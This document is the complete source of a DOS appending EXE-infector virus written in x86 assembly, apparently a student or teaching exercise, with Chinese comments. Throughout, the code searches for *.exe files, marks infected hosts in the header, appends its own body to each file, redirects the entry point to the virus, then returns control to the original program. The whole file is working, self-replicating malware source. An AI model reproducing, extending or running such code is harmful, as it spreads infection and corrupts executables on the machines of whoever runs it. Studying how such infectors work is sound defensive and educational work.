code segment
             assume cs:code
    start:   
             mov    ax,cs
             mov    ds,ax

             call   virus
    
             cmp    bp,0
             jnz    source
             mov    ah,4ch
             int    21h
    source:  
             mov    ax,4200h                    ;到文件头
             xor    cx,cx
             xor    dx,dx
             int    21h

             mov    ah,3fh                      ;读文件头
             mov    cx,30h
             lea    dx,[bp+offset head]
             mov    si,dx
             int    21h

             push   cs                          ;跳转回原程序代码
             mov    ax,word ptr [si+2eh]       ;2e即原来的14-15
             push   ax
             retf;远转移，修改ip和cs值

virus proc
             call   locate                      
    locate:  
             pop    bp                          ;bp=offset locate
             sub    bp,offset locate            ;bp=0
             lea    dx,[bp+offset string]       ;输出"I'm a virus!",13,10,'$'
             mov    ah,09h
             int    21h

             lea    dx,[bp+offset dta]          ;置dta，用于文件操作的缓冲区的内存地址
             mov    ah,1ah                      ;设置磁盘缓冲区DTA，，DS:DX=磁盘缓冲区首址
             int    21h

             lea    dx,[bp+offset filename]     ;匹配串"*.exe",0
             mov    cx,0                        ;cx:属性
             mov    ah,4eh                      ;查找第一个匹配项
             int    21h
             jnc    check                       
             ret;无匹配项直接结束
    next:
             mov    cx,4h
             
    check:
             lea    di,[bp+offset dta]
             add    di,1eh
             lea    si,[bp+offset string_virus]
             add    di,cx
             add    si,cx
             mov    ah,[di]
             mov    al,[si]
             cmp    ah,al
             jne    modify
             loop   check
             jmp    error
             
    modify:  
             lea    dx,[bp+offset dta]          ;匹配结果在磁盘缓冲区中,00f4
             add    dx,1eh                      ;文件名地址在1e~2ah

             mov    ax,3d02h                    ;3d打开文件,02方式：读写
             int    21h

             mov    bx,ax                       ;文件号
             mov    ax,4200h                    ;移动文件指针，从文件头绝对位移
             xor    cx,cx
             xor    dx,dx
             int    21h

             mov    ah,3fh                      ;读文件头,内容存到head
             mov    cx,30h                      ;读取30字节
             lea    dx,[bp+offset head]         ;dx指向数据缓冲区,012f
             mov    si,dx                       ;si=offset head
             int    21h

             cmp    word ptr [si],5a4dh         ;检查是否是exe,exe文件表示符，ZM
             jnz    nextfile

             ;exe文件，0~29H是文件头，2AH-1FFH都用00来填充，剩下的便是机器码
             cmp    word ptr [si+2ah],8888h     ;检查是否已被感染,0159
             je     nextfile
             mov    word ptr [si+2ah],8888h

             lea    dx,[bp+offset dta]          ;提示已感染
             add    dx,1eh                      
             mov    ah,09h
             int    21h

             mov    ax,word ptr [si+14h]       ;保存原程序入口;14-15H是原EXE文件载入时ip初始值
             mov    word ptr [si+2eh],ax       ;保存信息在head

             xor    cx,cx                       ;到文件尾，病毒代码插入到尾部
             xor    dx,dx
             mov    ax,4202h
             int    21h
;--------------------------------------------------
             push   ax
             sub    ax,200h;4002h写文件
             mov    cx,ax
             mov    ax,[si+16h]                 ;16-17H:表示 b.exe 被载入后 CS 的相对偏移地址

             mov    dx,10h
             mul    dx
             sub    cx,ax
             mov    word ptr [si+14h],cx        ;这里我是试出来病毒代码的内存地址的；；修改ip指向，程序入口为病毒代码
             pop    ax
             
             lea    dx,[bp+offset start]        ;写入代码
             lea    cx,[bp+offset theend]
             sub    cx,dx
             mov    ah,40h
             int    21h

             mov    ax,4202h                    ;计算新文件长度,修改头
             xor    cx,cx
             xor    dx,dx
             int    21h
             mov    cx,200h;计算最后一个扇区字节数和扇区数
             div    cx
             cmp    dx,0
             je     tmp
             inc    ax
             jmp    continue
    tmp:    
             mov    dx,200h
    continue: 
             mov    word ptr [si+2],dx;最后一个扇区字节数
             mov    word ptr [si+4],ax;总扇区数
    
             mov    ax,4200h                    ;到文件头的头部
             xor    cx,cx
             xor    dx,dx
             int    21h
             mov    ah,40h
             mov    dx,si;将新的文件头写入
             mov    cx,30h
             int    21h

    nextfile:
             mov    ah,3eh                      ;关闭文件
             int    21h

             mov    ah,4fh                      ;查找下一个文件
             int    21h
             jc     error
             jmp    next

    error:   
             ret
virus endp

    filename db     "*.exe",0
    dta      db     02ch dup(0)
    enter    db     'This file has the virus.',13,10,'$'
    string   db     "I'm a virus!",13,10,'$'
    head     db     30h dup(0)
    string_virus    db     "VIRUS"

    theend:  
code ends
end start
